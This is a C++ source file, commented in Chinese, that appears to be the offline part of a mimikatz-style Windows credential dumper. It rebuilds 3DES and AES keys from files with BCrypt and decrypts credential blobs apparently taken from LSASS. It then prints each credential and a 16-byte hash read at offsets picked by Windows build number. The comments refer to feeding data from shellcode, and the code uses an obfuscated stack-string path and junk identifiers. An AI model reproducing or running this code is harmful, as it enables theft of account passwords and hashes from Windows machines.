#include<stdio.h>
#include<Windows.h>
#include <iostream>
#include<fstream>
#include<stdio.h>
#include<iostream>

#pragma comment(lib, "Version.lib")
#pragma comment(lib, "Bcrypt.lib")


void getosversion(char* result) {
	char buffer[1024] = { 0 };
	char PATH[1024] = "C:\\Users\\123\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\1.dll";
	GetFileVersionInfoA(PATH,
		NULL,
		1024,
		(LPVOID)buffer);
	//	printf("%s\n", buffer);
		// 这很简单，遍历这个buffer，直到找到FileVersion的unicode版本就行了
		// 字节序里,长度22
	int result_counter = 0;
	byte asdasdasdbyte[1024] = { 0x46,0x00,0x69,0x00,0x6c,0x00,0x65,0x00,0x56,0x00,0x65,0x00,0x72,0x00,0x73,0x00,0x69,0x00,0x6f,0x00,0x6e,0x00 };
	for (int i = 0; i < 1024; i++) {
		// 相等则说明已经遍历到了fileversion字符串了
		if (0 == memcmp(buffer + i, asdasdasdbyte, 22)) {
			// 往后偏移四个字节就是版本号了
			char* versionoffset = buffer + i + 22 + 4;
			// 这个版本号其实就是一个unicode字符串，往后遍历，一直遍历到两个0就行了
			byte terminator[1024] = { 0x0,0x0 };
			int first = 1;
			for (int gi = 0; gi < 1024; gi++) {
				if (0 == memcmp(versionoffset + gi, terminator, 2)) {
					// 遍历完成，返回就行了
					return;
				}
				if (*(versionoffset + gi) != 0) {
					char _1[2] = { 0 };
					sprintf_s(_1, "%s", versionoffset + gi);
					if (first == 1) {
						//strcpy_s(result,2, _1);
						memcpy_s(result + result_counter, 100, _1, 1);
						result_counter += 1;
						first = 0;
					}
					else {
						//strcat_s(result+1,2, _1);
						memcpy_s(result + result_counter, 100, _1, 1);
						result_counter += 1;
					}
				}
			}
		}
	}
}


typedef struct _KIWI_BCRYPT_GEN_KEY {
	BCRYPT_ALG_HANDLE hProvider;
	BCRYPT_KEY_HANDLE hKey;
	PBYTE pKey;
	ULONG cbKey;
} KIWI_BCRYPT_GEN_KEY, * PKIWI_BCRYPT_GEN_KEY;
#include<ntstatus.h>

#if !defined(NT_SUCCESS)
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif
int main() {
	// 我可以从主程序的输出中获取版本号，让用户通过命令行传给我就行了
	// 或者更好的方法是，写入到文件中，写到通知shellcode的那个文件就行，反正shellcode只读取前面一部分
	// 而且前面那部分的长度是固定的   44bytes
	HANDLE hFiasdasdle = CreateFileA("ili6ao",               // file to open
		GENERIC_READ,          // open for reading
		FILE_SHARE_READ,       // share for reading
		NULL,                  // default security
		OPEN_EXISTING,         // existing file only
		FILE_ATTRIBUTE_NORMAL, // normal file
		NULL);
	if (INVALID_HANDLE_VALUE == hFiasdasdle)  return 0;
	// 读取文件
	BYTE _key_byasdasdtes[1024] = { 0 };
	DWORD out = 0;
	if (ReadFile(hFiasdasdle,
		_key_byasdasdtes,
		1024,
		&out,
		NULL
	) == FALSE)
		return 0;
	char* asdasdasdasd = (char*)malloc(123);
	ZeroMemory(asdasdasdasd, 123);
	
	char* readlyversionnumber = (char*)malloc(123);
	ZeroMemory(readlyversionnumber, 123);
	int counterrerer = 0;
	memcpy_s(asdasdasdasd, 123, _key_byasdasdtes + 44, strlen((char*)_key_byasdasdtes) - 44);
	for (int i = 0; i < strlen(asdasdasdasd); i++) {
		if (asdasdasdasd[i] == '.') {
			counterrerer++;
			// 从这里往后面遍历
			if (counterrerer == 2) {
				int asdasdcounasdasdasdasd = 0;
				for (int j = i + 1;; j++) {
					asdasdcounasdasdasdasd++;
					if (asdasdasdasd[j] == '.') {
						break;
					}
				}
				memcpy_s(readlyversionnumber, 123, asdasdasdasd + i + 1, asdasdcounasdasdasdasd-1);
			}
		}
	}
	printf("build version: %s\n", readlyversionnumber);
	int maxpowenum = strlen(readlyversionnumber) - 1;
	int finalnumber = 0;
	int oi = 0;
	for (int i = 0; i < maxpowenum; i++) {
		int temp= (readlyversionnumber[oi++]-'0')* pow(10, maxpowenum - i);
		finalnumber += temp;
	}
	finalnumber = finalnumber+ readlyversionnumber[strlen(readlyversionnumber) - 1] - '0';
	int _build_version = finalnumber;
	NTSTATUS status = STATUS_NOT_FOUND;
	KIWI_BCRYPT_GEN_KEY k3Des, kAes;
	ULONG dwSizeNeeded;
	// 初始化AESkey对象和3deskey对象
	status = BCryptOpenAlgorithmProvider(&k3Des.hProvider, BCRYPT_3DES_ALGORITHM, NULL, 0);
	if (NT_SUCCESS(status))
	{
		status = BCryptSetProperty(k3Des.hProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
		if (NT_SUCCESS(status))
		{
			status = BCryptGetProperty(k3Des.hProvider, BCRYPT_OBJECT_LENGTH, (PBYTE)&k3Des.cbKey, sizeof(k3Des.cbKey), &dwSizeNeeded, 0);
			if (NT_SUCCESS(status))
				k3Des.pKey = (PBYTE)LocalAlloc(LPTR, k3Des.cbKey);
		}
	}

	if (NT_SUCCESS(status))
	{
		status = BCryptOpenAlgorithmProvider(&kAes.hProvider, BCRYPT_AES_ALGORITHM, NULL, 0);
		if (NT_SUCCESS(status))
		{
			status = BCryptSetProperty(kAes.hProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CFB, sizeof(BCRYPT_CHAIN_MODE_CFB), 0);
			if (NT_SUCCESS(status))
			{
				status = BCryptGetProperty(kAes.hProvider, BCRYPT_OBJECT_LENGTH, (PBYTE)&kAes.cbKey, sizeof(kAes.cbKey), &dwSizeNeeded, 0);
				if (NT_SUCCESS(status))
					kAes.pKey = (PBYTE)LocalAlloc(LPTR, kAes.cbKey);
			}
		}
	}

	// 首先处理3deskey
	// 我们需要从文件中读取出来key的长度和内容

	// 获取文件句柄

	char stack_string[50] = { 0 };
	SecureZeroMemory(stack_string, 50);
	stack_string[0] = 'C'; stack_string[1] = ':'; stack_string[2] = '\\'; stack_string[3] = 'u'; stack_string[4] = 's'; stack_string[5] = 'e'; stack_string[6] = 'r'; stack_string[7] = 's'; stack_string[8] = '\\'; stack_string[9] = 'p'; stack_string[10] = 'u'; stack_string[11] = 'b'; stack_string[12] = 'l'; stack_string[13] = 'i'; stack_string[14] = 'c'; stack_string[15] = '\\'; stack_string[16] = 'i'; stack_string[17] = 'l'; stack_string[18] = 'i'; stack_string[19] = '6'; stack_string[20] = 'a'; stack_string[21] = 'o';
	HANDLE hFile = CreateFileA("3iaad",               // file to open
		GENERIC_READ,          // open for reading
		FILE_SHARE_READ,       // share for reading
		NULL,                  // default security
		OPEN_EXISTING,         // existing file only
		FILE_ATTRIBUTE_NORMAL, // normal file
		NULL);
	if (INVALID_HANDLE_VALUE == hFile)  return 0;
	// 读取文件
	BYTE _key_bytes[1024] = { 0 };
	DWORD out2 = 0;
	if (ReadFile(hFile,
		_key_bytes,
		1024,
		&out2,
		NULL
	) == FALSE)
		return 0;

	// 将前4字节解释成DWORD
	DWORD _3des_key_len = *(reinterpret_cast<DWORD*>(_key_bytes));



	/*
	_Must_inspect_result_
NTSTATUS
WINAPI
BCryptGenerateSymmetricKey(
    _Inout_                             BCRYPT_ALG_HANDLE   hAlgorithm,
    _Out_                               BCRYPT_KEY_HANDLE   *phKey,
    _Out_writes_bytes_all_opt_(cbKeyObject)  PUCHAR   pbKeyObject,
    _In_                                ULONG   cbKeyObject,
    _In_reads_bytes_(cbSecret)               PUCHAR   pbSecret,
    _In_                                ULONG   cbSecret,
    _In_      
	*/
	PKIWI_BCRYPT_GEN_KEY pGenKey = &k3Des;
	// 使用key创建出来一个秘钥对象
	BCryptGenerateSymmetricKey(pGenKey->hProvider,
		&pGenKey->hKey,
		pGenKey->pKey,
		pGenKey->cbKey,
		(PUCHAR)(_key_bytes + 4),   // 原始的key
		_3des_key_len,			// 原始key长度
		0)
		;



	CloseHandle(hFile);
	// aeskey也是使用同样的方式
	HANDLE hFile2 = CreateFileA("aiaad",               // file to open
		GENERIC_READ,          // open for reading
		FILE_SHARE_READ,       // share for reading
		NULL,                  // default security
		OPEN_EXISTING,         // existing file only
		FILE_ATTRIBUTE_NORMAL, // normal file
		NULL);
	if (INVALID_HANDLE_VALUE == hFile2)  return 0;
	// 读取文件
	BYTE _aes_key_bytes[1024] = { 0 };

	if (ReadFile(hFile2,
		_aes_key_bytes,
		1024,
		&out,
		NULL
	) == FALSE)
		return 0;

	CloseHandle(hFile2);
	// 将前4字节解释成DWORD
	DWORD _aes_key_len = *(reinterpret_cast<DWORD*>(_aes_key_bytes));


		PKIWI_BCRYPT_GEN_KEY pGenKey2 = &kAes;
	// 使用key创建出来一个秘钥对象
		BCryptGenerateSymmetricKey(pGenKey2->hProvider,
			&pGenKey2->hKey,
			pGenKey2->pKey,
			pGenKey2->cbKey,
			(PUCHAR)(_aes_key_bytes + 4),   // 原始的key
			_aes_key_len,			// 原始key长度
			0)
			;

	// 下面我们需要从文件中把密文读出来
		HANDLE hFile23 = CreateFileA("kiaad",               // file to open
			GENERIC_READ,          // open for reading
			FILE_SHARE_READ,       // share for reading
			NULL,                  // default security
			OPEN_EXISTING,         // existing file only
			FILE_ATTRIBUTE_NORMAL, // normal file
			NULL);
	if (INVALID_HANDLE_VALUE == hFile23)  return 0;
	// 读取文件
		// 我们没办法确定密文文件的长度，所以需要先获取文件大小
		DWORD fileSize = GetFileSize(hFile23, NULL);
	if (fileSize == INVALID_FILE_SIZE) {
		fprintf(stderr, "Error getting file size\n");
		CloseHandle(hFile);
		return 1;
	}

	BYTE* _enc = (BYTE*)malloc(fileSize + 1);

	if (ReadFile(hFile23,
		_enc,
		fileSize +1,
		&out,
		NULL
	) == FALSE)
		return 0;

	CloseHandle(hFile2);
	int counteeee = 0;
	int cpount____ = 1;
	// 将前4字节解释成DWORD
	while (1) {
		DWORD _enc_len = *(reinterpret_cast<DWORD*>(_enc + counteeee));
		BYTE* _enc_1 = (BYTE*)malloc(_enc_len + 1);
		ZeroMemory(_enc_1, _enc_len + 1);
		memcpy_s(_enc_1, _enc_len + 1, _enc + counteeee + 4, _enc_len);

		BCRYPT_KEY_HANDLE* hKey;
		ULONG cbIV, cbResult;
		// 初始向量随便写就行
		BYTE InitializationVector[16] = { 1,2,3,4 ,1,2,3,4 ,1,2,3,4 ,1,2,3,4 };
		BOOL Encrypt = 1;

		typedef NTSTATUS(WINAPI* PBCRYPT_ENCRYPT)					(__inout BCRYPT_KEY_HANDLE hKey, __in_bcount_opt(cbInput) PUCHAR pbInput, __in ULONG cbInput, __in_opt VOID* pPaddingInfo, __inout_bcount_opt(cbIV) PUCHAR pbIV, __in ULONG cbIV, __out_bcount_part_opt(cbOutput, *pcbResult) PUCHAR pbOutput, __in ULONG cbOutput, __out ULONG* pcbResult, __in ULONG dwFlags);

		PBCRYPT_ENCRYPT cryptFunc = Encrypt ? BCryptEncrypt : BCryptDecrypt;

		if (_enc_len % 8)
		{
			hKey = &kAes.hKey;
			cbIV = sizeof(InitializationVector);
		}
		else
		{
			hKey = &k3Des.hKey;
			cbIV = sizeof(InitializationVector) / 2;
		}

		status = BCryptDecrypt(*hKey,
			_enc_1,//(_enc_1+8), // 密文  +8跳过primary字符串
			_enc_len,//_enc_len-8,//密文长度
			0, InitializationVector, cbIV, _enc_1, _enc_len, &cbResult, 0);

		printf("==========================Credentail %d==========================\n", cpount____++);
		// 直接作为字符串进行打印
		// 首先打印出字节序列
		// 获取偏移量
		/*
		版本号低于  10240 的偏移量为

32+8=====40

版本号  大于10240小于10586 的偏移量为
38+8=====46


版本号  大于10586小于14393 的偏移量为
40+8=====48

高于14393 的偏移量为
74+8=====82
			*/
		int offset____ = 0;
		if (_build_version < 10240) {
			offset____ = 40;
		}
		else if (_build_version < 10586) {
			offset____ = 46;
		}
		else if (_build_version < 14393) {
			offset____ = 48;
		}
		else {
			offset____ = 82;
		}
		
		// 从offset处拷贝出来16bytes
		BYTE* finakfuck = (BYTE*)malloc(16);
		ZeroMemory(finakfuck, 16);
		memcpy_s(finakfuck, 16, _enc_1+offset____, 16);

		for (int i = 0; i < 16;i++) {
			// 需要将每个字节作为16进制的形式进行打印
			printf("%02x", finakfuck[i]);

		}
		printf("\n");


			for (int i = 0; i < cbResult; i++) {
				if (_enc_1[i] == 0) {
					//如果前边不是0，就不输出下划线（考虑到unicode的情况）
					if ((i != 0) && (_enc_1[i - 1] != 0)) { int a = 1; }
					else {
						printf("_");
						continue;
					}
				}

				// 如果是非打印字符显示_
				if (!(_enc_1[i] > 31 && _enc_1[i] < 127) && _enc_1[i] != 0) {
					printf("_"); continue;
				}
				else if (_enc_1[i] == 0)
				{
					int a = 1; continue;
				}
				printf("%c", _enc_1[i]);
			}

			printf("\n\n");

			free(_enc_1);
		// 如果还没有超出文件长度，说明后面还有一组密文
			if (counteeee + 4 + _enc_len < fileSize)
				counteeee = counteeee + 4 + _enc_len;
			else break;

	}

	exit(-1);
	char* res = (char*)malloc(1234);
	ZeroMemory(res, 1234);
	getosversion(res);
	//printf("%s\n", res);
		// 遍历到第一个空格
	for (int i = 0; i < 1234; i++) {
		if (res[i] == ' ') {
			// 在这里断掉
			res[i] = '\0'; break;
		}
	}
	printf("%s\n", res);
}
